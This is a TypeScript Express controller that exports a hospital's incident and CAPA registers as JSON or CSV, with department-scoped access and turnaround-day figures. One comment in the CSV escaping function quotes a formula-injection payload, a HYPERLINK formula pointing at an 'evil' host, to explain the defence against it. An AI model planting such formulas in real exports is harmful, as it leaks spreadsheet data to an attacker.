import { Request, Response, NextFunction } from 'express';
import { z } from 'zod';
import { Incident, INCIDENT_STATUSES } from '../incidents/incident.model.js';
import { Capa, CAPA_STATUSES } from '../capa/capa.model.js';
import '../users/user.model.js';
import '../departments/department.model.js';
import '../locations/location.model.js';
import '../categories/category.model.js';
import { sendSuccess } from '../../common/helpers/response.js';
import { hasPermission, incidentScopeFilter } from '../../common/helpers/incidentAccess.js';
import { PERMISSIONS } from '../../common/enums/permissions.js';

// Registers for audits (NABH/JCI) and export. Rows are flat and include turnaround days,
// so the on-screen table and the CSV export show exactly the same figures.

const DAY_MS = 24 * 60 * 60 * 1000;
const days = (from?: Date, to?: Date): number | null =>
  from && to && to >= from ? Math.round(((to.getTime() - from.getTime()) / DAY_MS) * 10) / 10 : null;

const dateParam = z
  .string()
  .optional()
  .refine((v) => !v || !Number.isNaN(Date.parse(v)), 'Invalid date');

const incidentQuerySchema = z.object({
  fromDate: dateParam,
  toDate: dateParam,
  departmentId: z.string().optional(),
  severity: z.coerce.number().int().min(1).max(5).optional(),
  status: z.enum(INCIDENT_STATUSES).optional(),
  format: z.enum(['csv', 'json']).optional(),
});

const capaQuerySchema = z.object({
  status: z.enum(CAPA_STATUSES).optional(),
  ownerDepartmentId: z.string().optional(),
  overdue: z.enum(['true', 'false']).optional(),
  format: z.enum(['csv', 'json']).optional(),
});

/** End of the given day, so "to 2026-09-19" includes incidents reported that day. */
const endOfDay = (value: string) => {
  const d = new Date(value);
  d.setHours(23, 59, 59, 999);
  return d;
};

const escapeCsvField = (value: any): string => {
  if (value === null || value === undefined) return '';
  let str = String(value);
  // Defuse CSV/formula injection (OWASP): several exported columns are free text a Staff or
  // HOD user wrote (title, description, CAPA action, remarks). A leading =, +, -, @, tab or CR
  // makes Excel/LibreOffice run the cell as a formula when the file is opened, so a report
  // titled e.g. `=HYPERLINK("http://evil/steal?"&A1)` would execute for whoever opens the export.
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  if (/[",\r\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
};

const buildCsv = (headers: string[], rows: any[][]): string => {
  const headerLine = headers.map(escapeCsvField).join(',');
  const rowLines = rows.map((r) => r.map(escapeCsvField).join(','));
  return [headerLine, ...rowLines].join('\r\n');
};

export const getIncidentRegisterReport = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
  try {
    const q = incidentQuerySchema.parse(req.query);

    const query: any = { $and: [incidentScopeFilter(req.user)] };
    if (q.fromDate || q.toDate) {
      query.reportedAt = {};
      if (q.fromDate) query.reportedAt.$gte = new Date(q.fromDate);
      if (q.toDate) query.reportedAt.$lte = endOfDay(q.toDate);
    }
    if (q.departmentId) query.departmentId = q.departmentId; // responsible department
    if (q.severity) query.severity = q.severity;
    if (q.status) query.status = q.status;

    const incidents: any[] = await Incident.find(query)
      .populate('reportedBy', 'name')
      .populate('reportingDepartmentId', 'name')
      .populate('occurredInDepartmentId', 'name')
      .populate('departmentId', 'name')
      .populate('assignedHod', 'name')
      .populate('categoryId', 'name subcategories')
      .populate('locationId', 'name')
      .sort({ reportedAt: -1 })
      .limit(5000)
      .lean();

    const rows = incidents.map((i) => {
      const firstAssignedAt = i.assignments?.[0]?.at ?? i.assignedAt;
      return {
        _id: i._id,
        incidentNumber: i.incidentNumber,
        reportedAt: i.reportedAt,
        occurredAt: i.incidentDateTime,
        title: i.title,
        category: i.categoryId?.name,
        subcategory: i.categoryId?.subcategories?.find((s: any) => s.code === i.subcategoryCode)?.name,
        reportedBy: i.reportedBy?.name,
        reportingDepartment: i.reportingDepartmentId?.name,
        occurredInDepartment: i.occurredInDepartmentId?.name,
        location: i.locationId?.name,
        responsibleDepartment: i.departmentId?.name,
        hod: i.assignedHod?.name,
        patientUhid: i.patientInvolved ? i.patient?.uhid : undefined,
        reportedSeverity: i.initialSeverity ?? i.severity,
        severity: i.severity,
        status: i.status,
        assignedAt: firstAssignedAt,
        submittedForReviewAt: i.closureSubmission?.at,
        closedAt: i.closedAt,
        daysToAssign: days(i.reportedAt, firstAssignedAt),
        daysAssignToSubmit: days(firstAssignedAt, i.closureSubmission?.at),
        daysReviewToClose: days(i.closureSubmission?.at, i.closedAt),
        daysToClose: days(i.reportedAt, i.closedAt),
        hodReturns: i.hodReturns?.length ?? 0,
        sentBackByQuality: (i.qualityReviews || []).filter((r: any) => r.decision === 'RETURNED').length,
      };
    });

    if (q.format === 'csv') {
      const headers = [
        'Incident Number',
        'Reported Date',
        'Occurred Date',
        'Title',
        'Category',
        'Subcategory',
        'Reported By',
        'Reporting Department',
        'Occurred In Department',
        'Location',
        'Responsible Department',
        'Assigned HOD',
        'Patient UHID',
        'Reported Severity',
        'Confirmed Severity',
        'Status',
        'Assigned Date',
        'Submitted for Review Date',
        'Closed Date',
        'Days to Assign',
        'Days Assign to Submit',
        'Days Review to Close',
        'Total Days to Close',
        'HOD Returns Count',
        'Quality Send Backs Count',
      ];
      const csvRows = rows.map((r) => [
        r.incidentNumber,
        r.reportedAt ? new Date(r.reportedAt).toISOString() : '',
        r.occurredAt ? new Date(r.occurredAt).toISOString() : '',
        r.title,
        r.category ?? '',
        r.subcategory ?? '',
        r.reportedBy ?? '',
        r.reportingDepartment ?? '',
        r.occurredInDepartment ?? '',
        r.location ?? '',
        r.responsibleDepartment ?? '',
        r.hod ?? '',
        r.patientUhid ?? '',
        r.reportedSeverity,
        r.severity,
        r.status,
        r.assignedAt ? new Date(r.assignedAt).toISOString() : '',
        r.submittedForReviewAt ? new Date(r.submittedForReviewAt).toISOString() : '',
        r.closedAt ? new Date(r.closedAt).toISOString() : '',
        r.daysToAssign ?? '',
        r.daysAssignToSubmit ?? '',
        r.daysReviewToClose ?? '',
        r.daysToClose ?? '',
        r.hodReturns,
        r.sentBackByQuality,
      ]);

      const csv = '\uFEFF' + buildCsv(headers, csvRows);
      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
      res.setHeader('Content-Disposition', 'attachment; filename="incident_register.csv"');
      res.status(200).send(csv);
      return;
    }

    sendSuccess(res, rows, 'Incident register fetched');
  } catch (error) {
    next(error);
  }
};

export const getCapaRegisterReport = async (req: Request, res: Response, next: NextFunction): Promise<void> => {
  try {
    const q = capaQuerySchema.parse(req.query);

    const query: any = {};
    if (q.status) query.status = q.status;
    if (q.ownerDepartmentId) query.ownerDepartmentId = q.ownerDepartmentId;
    // Department-level viewers only get their own department's CAPAs
    if (!hasPermission(req.user, PERMISSIONS.REPORT_VIEW_ALL)) {
      query.ownerDepartmentId = req.user?.departmentId;
    }
    const startOfToday = new Date();
    startOfToday.setHours(0, 0, 0, 0);
    if (q.overdue === 'true') {
      query.status = 'OPEN';
      query.targetDate = { $lt: startOfToday };
    }

    const capas: any[] = await Capa.find(query)
      .populate('incidentId', 'incidentNumber title')
      .populate('ownerUserId', 'name')
      .populate('ownerDepartmentId', 'name')
      .populate('verification.verifiedBy', 'name')
      .sort({ targetDate: 1 })
      .limit(5000)
      .lean();

    const rows = capas.map((c) => ({
      _id: c._id,
      capaNumber: c.capaNumber,
      incidentId: c.incidentId?._id,
      incidentNumber: c.incidentId?.incidentNumber,
      incidentTitle: c.incidentId?.title,
      department: c.ownerDepartmentId?.name,
      owner: c.ownerUserId?.name,
      type: c.type,
      action: c.action,
      priority: c.priority,
      assignedAt: c.assignedDate,
      targetDate: c.targetDate,
      status: c.status,
      overdue: c.status === 'OPEN' && c.targetDate < startOfToday,
      completedAt: c.completedAt,
      completionRemarks: c.completionRemarks,
      reviewedBy: c.verification?.verifiedBy?.name,
      reviewedAt: c.verification?.verifiedAt,
      reviewRemarks: c.verification?.remarks,
    }));

    if (q.format === 'csv') {
      const headers = [
        'CAPA Number',
        'Incident Number',
        'Incident Title',
        'Department',
        'Owner',
        'Type',
        'Action',
        'Priority',
        'Assigned Date',
        'Target Date',
        'Status',
        'Overdue',
        'Completed Date',
        'Completion Remarks',
        'Reviewed By',
        'Reviewed Date',
        'Review Remarks',
      ];
      const csvRows = rows.map((c) => [
        c.capaNumber,
        c.incidentNumber ?? '',
        c.incidentTitle ?? '',
        c.department ?? '',
        c.owner ?? '',
        c.type,
        c.action,
        c.priority,
        c.assignedAt ? new Date(c.assignedAt).toISOString() : '',
        c.targetDate ? new Date(c.targetDate).toISOString() : '',
        c.status,
        c.overdue ? 'YES' : 'NO',
        c.completedAt ? new Date(c.completedAt).toISOString() : '',
        c.completionRemarks ?? '',
        c.reviewedBy ?? '',
        c.reviewedAt ? new Date(c.reviewedAt).toISOString() : '',
        c.reviewRemarks ?? '',
      ]);

      const csv = '\uFEFF' + buildCsv(headers, csvRows);
      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
      res.setHeader('Content-Disposition', 'attachment; filename="capa_register.csv"');
      res.status(200).send(csv);
      return;
    }

    sendSuccess(res, rows, 'CAPA register fetched');
  } catch (error) {
    next(error);
  }
};
